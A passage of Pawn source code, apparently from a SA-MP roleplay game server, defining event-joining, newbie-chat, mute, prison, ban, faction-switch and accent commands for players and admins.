					SendClientMessage(i, COLOR_WHITE, "The event has now started. If you wish to join next time, please use /joinevent.");
				}
			}

		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Use /lockevent first to lock the event, or /endevent to create a new event.");
		}
	}
	return 1;
}

CMD:joinevent(playerid, params[]) {
	new
		szMessage[128];
	if(EventInfo[EventStatus] == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "There are currently no active events.");

	if(AdminDuty[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't join the event while you're on admin duty. Use /eventstaff or go off duty.");

	if(GetPVarType(playerid, "posX") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't join the event while you're on a help request.");

	if(GetPVarInt(playerid, "EventToken") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You're already in the event.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");

	if(PlayerCuffed[playerid] >= 1 || PlayerInfo[playerid][pJailTime] > 0 || GetPVarInt(playerid, "Hospital") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "Young padawan, you can't join an event before you've played 2 full hours due to the weapon restrictions.");

	if(EventInfo[EventPlayers] >= EventInfo[EventLimit] && EventInfo[EventTime] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "This event has reached the max players limit.");

	if(PlayerDragged[playerid] != 0 || IsCopDragging[playerid] != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] == 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFaction] != PlayerInfo[playerid][pFaction]) {
		format(szMessage, sizeof(szMessage), "This event is for only %s members.", GetFactionName(EventInfo[EventFaction]));
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
		return 1;
	} else if(EventInfo[EventFamily] < 255 && EventInfo[EventFaction] == 0 && EventInfo[EventFamily] != 1337 && EventInfo[EventFamily] != PlayerInfo[playerid][pGang]) {
		format(szMessage, sizeof(szMessage), "This event is for only %s members.", FamilyInfo[EventInfo[EventFamily]][FamilyName]);
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
		return 1;
	} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 255 && PlayerInfo[playerid][pFaction] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "This event is for only faction members.");
	else if(EventInfo[EventFamily] == 1337 && EventInfo[EventFaction] == 0 && PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GRAD2, "This event is for only family members.");
	else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 1337 && PlayerInfo[playerid][pGang] == 255 && PlayerInfo[playerid][pFaction] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "This event is for only family and faction members.");
	else if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] < 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFamily] != 1337) {
		if(PlayerInfo[playerid][pGang] != EventInfo[EventFamily] && PlayerInfo[playerid][pFaction] != EventInfo[EventFaction]) {
			format(szMessage, sizeof(szMessage), "This event is for only %s & %s members.", FamilyInfo[EventInfo[EventFamily]][FamilyName], GetFactionName(EventInfo[EventFaction]));
			SendClientMessage(playerid, COLOR_GRAD2, szMessage);
			return 1;
		}
	} else { }

	if(EventInfo[EventStatus] == 2) {
		if(EventInfo[EventType] == 3)
		{
			// For down the road, racing
		}
		else
		{
			if(IsPlayerInAnyVehicle(playerid)) {
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't join while in a vehicle.");
			}

			SetPVarInt(playerid, "EventToken", 1);
			if(EventInfo[EventToggleAnims] == 1) SetPVarInt(playerid, "EventAnims", 1);
			ResetPlayerWeapons(playerid);
			pTazer[playerid] = 0;
			GetPlayerHealth(playerid, EventFloats[playerid][4]);
			GetPlayerArmour(playerid, EventFloats[playerid][5]);
			EventLastVW[playerid] = GetPlayerVirtualWorld(playerid);
			EventLastInt[playerid] = GetPlayerInterior(playerid);
			GetPlayerPos(playerid, EventFloats[playerid][1], EventFloats[playerid][2], EventFloats[playerid][3]);
			GetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
			if(EventInfo[EventType] != 2)
			{
				SetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
			}
			SetPlayerInterior(playerid, EventInfo[EventInterior]);
			SetPlayerVirtualWorld(playerid, EventInfo[EventWorld]);
			SendClientMessage(playerid, COLOR_WHITE, EventInfo[EventJT]);
			SetPlayerHealth(playerid, EventInfo[EventHealth]);
			SetPlayerArmourEx(playerid, EventInfo[EventArmor]);

			if(EventInfo[EventType] == 2)
			{
				SetPlayerSkin(playerid, EventInfo[EventTeamSkin][nextteam]);
				new color = EventInfo[EventTeamColor][nextteam];
				if(color==0) SetPlayerColor(playerid, 0x00000000);
				if(color==1) SetPlayerColor(playerid, 0xFFFFFF00);
				if(color==2) SetPlayerColor(playerid, 0x2641FE00);
				if(color==3) SetPlayerColor(playerid, 0xAA333300);
				if(color==16) SetPlayerColor(playerid, 0x33AA3300);
				if(color==5) SetPlayerColor(playerid, 0xC2A2DA00);
				if(color==6) SetPlayerColor(playerid, 0xFFFF0000);
				if(color==7) SetPlayerColor(playerid, 0x33CCFF00);
				//if(strcmp(clr, "navy", true)==0) color=94;
				//if(strcmp(clr, "beige", true)==0) color=102;
				if(color==51) SetPlayerColor(playerid, 0x2D6F0000);
				if(color==103) SetPlayerColor(playerid, 0x0B006F00);
				if(color==13) SetPlayerColor(playerid, 0x52525200);
				if(color==55) SetPlayerColor(playerid, 0xB46F0000);
				if(color==84) SetPlayerColor(playerid, 0x814F0000);
				if(color==74) SetPlayerColor(playerid, 0x750A0000);
				//if(strcmp(clr, "maroon", true)==0) color=115;
				if(color==126) SetPlayerColor(playerid, 0xFF51F100);
				if(nextteam == 0)
				{
					SetPlayerPos(playerid, EventInfo[EventTeamPosX1], EventInfo[EventTeamPosY1], EventInfo[EventTeamPosZ1]);
				}
				else
				{
					SetPlayerPos(playerid, EventInfo[EventTeamPosX2], EventInfo[EventTeamPosY2], EventInfo[EventTeamPosZ2]);
				}
				SetPlayerTeam(playerid, nextteam);
				EventTeam[playerid] = nextteam;

				if(nextteam == 0) nextteam++;
				else if(nextteam == 1) nextteam--;
			}
		}
		EventInfo[EventPlayers] ++;
		if(EventInfo[EventPlayers] == EventInfo[EventLimit] && EventInfo[EventTime] == 0)
		{
			ABroadCast(COLOR_YELLOW, "The event has now reached the max players limit, you can now start it.", 2);
		}
	}

	else if(EventInfo[EventStatus] == 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "The event is already locked. you're unable to join.");
	}
	else if(EventInfo[EventStatus] == 4)
	{
		SendClientMessage(playerid, COLOR_WHITE, "The event is already started. you're unable to join.");
	}
	return 1;
}

CMD:quitevent(playerid, params[])
{
    if(GetPVarInt(playerid, "EventToken") == 1) {
        if(EventInfo[EventStatus] == 1 || EventInfo[EventStatus] == 2)
		{
       		SendClientMessage(playerid, COLOR_WHITE, "You can't quit the event at this stage of the event.");
       		return 1;
		}
      	ResetPlayerWeapons(playerid);
		SetPlayerTeam(playerid, -1);
		EventTeam[playerid] = -1;
		DeletePVar(playerid, "EventToken");
		DeletePVar(playerid, "EventAnims");
       	SetPlayerWeapons(playerid);
       	SetPlayerToTeamColor(playerid);
       	SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
       	SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
      	SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
		if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
			LoadObjectsForPlayer(playerid);
		}
       	SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
       	SetPlayerInterior(playerid,EventLastInt[playerid]);
       	SetPlayerHealth(playerid, EventFloats[playerid][4]);
       	SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
       	for(new i = 0; i < 6; i++) {
        	EventFloats[playerid][i] = 0.0;
        }
        EventLastVW[playerid] = 0;
        EventLastInt[playerid] = 0;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have quit the event.");
    }
    return 1;
}

CMD:newb(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");

	if((nonewbie) && PlayerInfo[playerid][pAdmin] < 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "The newbie chat channel has been disabled by an Admin!");

	if(gNewbie[playerid] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "You have the channel toggled, /tognewbie to re-enable!");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/newb)ie [text]");

	if(PlayerInfo[playerid][pNMute] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "You're muted from the newbie chat channel.");

	new
		string[128];

	if(NewbieTimer[playerid] > 0) {
		format(string, sizeof(string), "You must wait %d seconds before speaking again in this channel.", NewbieTimer[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
		return 1;
	}

	if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pHelper] < 1)
		NewbieTimer[playerid] = 45;

	if(PlayerInfo[playerid][pHelper] == 1)
		format(string, sizeof(string), "** Junior Helper %s: %s", GetPlayerNameEx(playerid), params);
 	else if(PlayerInfo[playerid][pHelper] == 2)
		format(string, sizeof(string), "** Senior Helper %s: %s", GetPlayerNameEx(playerid), params);
	else if(PlayerInfo[playerid][pAdmin] < 1)
		format(string, sizeof(string), "** Newbie %s: %s", GetPlayerNameEx(playerid), params);
	else if(PlayerInfo[playerid][pAdmin] >= 1)
		format(string, sizeof(string), "** Admin %s: %s", GetPlayerNameEx(playerid), params);

	foreach(Player, n) {
		if(gNewbie[n] == 0)
			SendClientMessageEx(n, COLOR_NEWBIE, string);
	}
	return 1;
}

CMD:nonewbie(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(!nonewbie) {
			nonewbie = 1;
			SendClientMessageToAllEx(COLOR_GRAD2, "Newbie chat channel disabled by an Admin!");
		}
		else {
			nonewbie = 0;
			SendClientMessageToAllEx(COLOR_GRAD2, "Newbie chat channel enabled by an Admin!");
		}
	}
	else return	SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:nmute(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /nmute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				return SendClientMessage(playerid, COLOR_LIGHTRED, "You can't /nmute admins");

			if(PlayerInfo[giveplayerid][pNMute] == 0) {
				PlayerInfo[giveplayerid][pNMute] = 1;
				PlayerInfo[giveplayerid][pNMuteTotal] += 1;
				format(string, sizeof(string), "AdmCmd: %s was muted from speaking in /newb by %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);

				if(PlayerInfo[giveplayerid][pNMuteTotal] > 6) {
					new playerip[32];
					GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was banned by %s, reason: Excessive newbie chat mutes", GetPlayerNameEx(giveplayerid),playerip,GetPlayerNameEx(playerid));
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdmCmd: %s was banned, reason: Excessive newbie chat mutes.", GetPlayerNameEx(giveplayerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[giveplayerid][pBanned] = 1;
					new ip[32];
					GetPlayerIp(giveplayerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(giveplayerid);
				}

				SendClientMessage(giveplayerid, COLOR_WHITE, "Remember, the newbie chat channel is only for script/server related questions and may not be used for any other purpose, unless stated otherwise by an admin.");
				SendClientMessage(giveplayerid, COLOR_WHITE, "If you wish to be unmuted, you will be fined or jailed. Future abuse could result in increased punishment. If you feel this was in error, contact a Level 4+ Admin.");

				foreach(Player, i)
				{
					if(PlayerInfo[i][pAdmin] == 0)
					{
						format(string, sizeof(string), "AdmCmd: %s was just muted from using Newbie Chat [/newb] due to misuse.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(i, COLOR_LIGHTRED, string);
					}
				}
			}
			else {
				ShowNMuteFine(giveplayerid);
				format(string, sizeof(string), "You offered %s an unmute from /newb.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTRED, string);
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:nunmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /nunmute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pNMute] == 1)
			{
				format(string, sizeof(string), "AdmCmd: %s was unmuted from speaking in /newb by %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);
				PlayerInfo[giveplayerid][pNMute] = 0;
				PlayerInfo[giveplayerid][pNMuteTotal]--;
			}
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED,"That player is not muted from /newb!");
			}

		}
	}
	return 1;
}

CMD:admute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /admute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
				if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				{
					return SendClientMessage(playerid, COLOR_LIGHTRED, "You can't /admute admins");
				}
				if(PlayerInfo[giveplayerid][pADMute] == 0)
				{
					PlayerInfo[giveplayerid][pADMute] = 1;
					PlayerInfo[giveplayerid][pADMuteTotal] += 1;
	    			szAdvert[giveplayerid][0] = 0;
					format(string, sizeof(string), "AdmCmd: %s was muted from placing /ad's by %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
					Log("logs/admin.log", string);
					ABroadCast(COLOR_LIGHTRED,string,1);

					if(PlayerInfo[giveplayerid][pADMuteTotal] > 6)
					{
						new playerip[32];
						GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdmCmd: %s(IP:%s) was banned by %s, reason: Excessive advertisement mutes", GetPlayerNameEx(giveplayerid),playerip,GetPlayerNameEx(playerid));
						Log("logs/ban.log", string);
						format(string, sizeof(string), "AdmCmd: %s was banned, reason: Excessive advertisement mutes.", GetPlayerNameEx(giveplayerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[giveplayerid][pBanned] = 1;
						new ip[32];
						GetPlayerIp(giveplayerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(giveplayerid);
					}

					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "Remember, advertisements may only be used for IC purposes and may not be used for any other purpose, unless stated otherwise by an admin.");
					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "If you wish to be unmuted, you will be fined or jailed. Future abuse could result in increased punishment. If you feel this was in error, contact a Level 4+ Admin.");

					format(string, sizeof(string), "AdmCmd: %s was just muted from using Advertisements [/ad] due to misuse.", GetPlayerNameEx(giveplayerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				}
				else
				{
					ShowAdMuteFine(giveplayerid);
					format(string, sizeof(string), "You offered %s an unmute from /ad.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTRED, string);
				}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:adunmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new string[128], giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adunmute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pADMute] == 1)
			{
				if(PlayerInfo[giveplayerid][pJailed] != 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTRED, "You can't offer someone in jail/prison an unmute!");
					SendClientMessage(giveplayerid, COLOR_LIGHTRED, "Sorry, you can't be unmuted from /ad while you're in jail/prison.");
					return 1;
				}
				format(string, sizeof(string), "AdmCmd: %s was unmuted from /ad by %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				Log("logs/admin.log", string);
				PlayerInfo[giveplayerid][pADMute] = 0;
				PlayerInfo[giveplayerid][pADMuteTotal]--;
			}
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED,"That player is not muted from /newb!");
			}

		}
	}
	return 1;
}

CMD:setname(playerid, params[]) {
	new
		szQuery[128],
		iTarget,
		szNewName[MAX_PLAYER_NAME];

	if(sscanf(params, "us[24]", iTarget, szNewName))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setname [playerid/partofname] [newname]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

	if(PlayerInfo[playerid][pAdmin] < 4)
	    return SendClientMessage(playerid, COLOR_GREY, "Insufficient admin level. ");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(AdminDuty[iTarget] == 1)
 		return SendClientMessage(playerid,COLOR_WHITE, "You can't use /setname on an on-duty admin.");

	if(strfind(szNewName, "_", false) == -1)
		return SendClientMessage(playerid, COLOR_GREY, "The name must include an underscore ('_').");

	mysql_escape_string(szNewName, szNewName,MAX_PLAYER_NAME,sqldb);

	SetPVarInt(iTarget, "requestby", playerid);
	SetPVarInt(iTarget, "requestpath", 3);
	SetPVarString(iTarget, "requestedname", szNewName);

	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szNewName);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_CHECK_NEW_NAME,iTarget);

	return 1;
}

CMD:sprison(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		new string[128], giveplayerid, minutes, reason[64];
		if(sscanf(params, "uds[64]", giveplayerid, minutes, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sprison [playerid/partofname] [minutes] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on an equal or higher level admin that is on-duty.");
				return 1;
			}

			if(strlen(reason) >= 25)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Please provide a shorter reason. The maximum length for a prison reason is 25.");
				return 1;
			}
			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);
			GameTextForPlayer(giveplayerid, "~w~Welcome to ~n~~r~Admin Prison", 5000, 3);
			ResetPlayerWeaponsEx(giveplayerid);
			format(string, sizeof(string), "AdmCmd: %s has been silent prisoned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdmCmd: %s has been prisoned by an Admin, reason: %s", GetPlayerNameEx(giveplayerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailed] = 3;
			PlayerInfo[giveplayerid][pJailTime] = minutes*60;
			format(PlayerInfo[giveplayerid][pPrisonReason], 128, "%s", reason);
			format(PlayerInfo[giveplayerid][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
			PhoneOnline[giveplayerid] = 1;

		    LoadObjectsForPlayer(giveplayerid);

			SetPlayerInterior(giveplayerid, 69);
			PlayerInfo[giveplayerid][pVW] = 696969;
			PlayerInfo[giveplayerid][pInt] = 69;
			SetPlayerVirtualWorld(giveplayerid, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(giveplayerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			SetPlayerSkin(giveplayerid, 50);
			SetPlayerColor(giveplayerid, TEAM_APRISON_COLOR);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:switchfac(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		new string[128], factionid;
		if(sscanf(params, "d", factionid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /switchfac [factionid]");
			SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Disabled |5 Government |9 SA News");
			return 1;
		}

		switch(factionid) {
			case 1: {
				format(string, sizeof(string), "You have switched to faction ID %d (LSPD).", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 2: {
				format(string, sizeof(string), "You have switched to faction ID %d (FBI).", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 3:	{
				format(string, sizeof(string), "You have switched to faction ID %d (LSFMD).", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 4: {
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't switch to the Hitman Agency with /switchfac.");
			}
			case 5: {
				format(string, sizeof(string), "You have switched to faction ID %d (Government).", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			case 9: {
				format(string, sizeof(string), "You have switched to faction ID %d (SA News).", factionid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pFaction] = factionid;
				PlayerInfo[playerid][pRank] = 6;
				PlayerInfo[playerid][pGang] = 255;
			}
			default: {
				SendClientMessage(playerid, COLOR_WHITE, "Invalid Faction ID!");
				SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Disabled |5 Government |9 SANews");
			}
		}
	}
	return 1;
}

CMD:switchfam(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		new string[128], familyid;
		if(sscanf(params, "d", familyid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /switchfam [familyid]");

		if(familyid < 1 || familyid > 14) return SendClientMessage(playerid, COLOR_WHITE, "Invalid Family Number.");
		format(string, sizeof(string), "You have switched to family ID %d (%s).", familyid, FamilyInfo[familyid-1][FamilyName]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		PlayerInfo[playerid][pRank] = 6;
		PlayerInfo[playerid][pGang] = familyid-1;
		PlayerInfo[playerid][pFaction] = 0;
		PlayerInfo[playerid][pLeader] = 0;
	}
	return 1;
}

CMD:clearall(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
        foreach(Player, i) {
            PlayerInfo[i][pWantedLevel] = 0;
            SetPlayerToTeamColor(i);
            SetPlayerWantedLevel(i, 0);
            ClearCrime(i);
        }
        SendClientMessage(playerid,COLOR_GRAD1, "You have cleared everyone's Wanted Level.");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:permaban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /permaban [playerid/partofname] [reason]");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			{
				if(AdminDuty[playerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}
				format(string, sizeof(string), "AdmCmd: %s has been auto-banned, reason: Trying to /permaban a higher admin.", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				PlayerInfo[playerid][pBanned] = 3;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
			}
			else
			{
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was permanently banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdmCmd: %s was permanently banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], GetPlayerNameEx(playerid), reason);
				}
				else
				{
					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was permanently banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdmCmd: %s was permanently banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				}

				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pPermaBanned] = 1;
				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
			}
			return 1;
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:setcolor(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
	{
        ShowPlayerDialogEx(playerid, COLORMENU, DIALOG_STYLE_LIST, "Color Menu", "Blue\nBlack\nRed\nOrange\nPink\nPurple\nGreen\nYellow\nWhite", "Select", "Cancel");
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:accent(playerid, params[])
{
	new accent;
	if(sscanf(params, "d", accent))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /accent [accent ID]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Names: Normal [1], British [2], Asian [3], Scottish [4], Irish [5], Russian [6], American [7]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Accents: Spanish [8], Southern [9], Cuban [10], Italian [11], Gangster [12], Australian [13]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available Accents: Arabic [14], Balkan [15], Canadian [16], Jamaican [17], Israeli [18], Indian [19]");
        SendClientMessage(playerid, COLOR_GRAD2, "Available Accents: Welsh [20], French [21], German [22], Dutch [23], South African [24], No Accent [25]");
		return 1;
	}

	switch(accent)
	{
	case 1:
		{
			PlayerInfo[playerid][pAccent] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Normal accent, use /accent to change it.");
		}
	case 2:
		{
			PlayerInfo[playerid][pAccent] = 2;
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the British accent, use /accent to change it.");
		}
	case 3:
		{
			PlayerInfo[playerid][pAccent] = 3;
